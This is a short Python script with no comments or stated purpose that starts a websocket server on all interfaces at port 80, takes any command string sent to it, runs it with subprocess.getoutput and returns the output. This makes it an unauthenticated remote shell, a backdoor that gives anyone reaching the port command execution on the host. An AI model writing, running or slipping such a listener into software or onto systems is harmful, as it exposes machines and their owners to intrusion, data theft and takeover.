import asyncio
import websockets
import subprocess



async def shell(websocket, path):
    while True:
        cmd = await websocket.recv()
        print(f"Running: {cmd}")
        output = subprocess.getoutput(cmd) + '\n'
        await websocket.send(output)


while 1:
    start_shell = websockets.serve(shell, "0.0.0.0", 80)

    asyncio.get_event_loop().run_until_complete(start_shell)
    asyncio.get_event_loop().run_forever()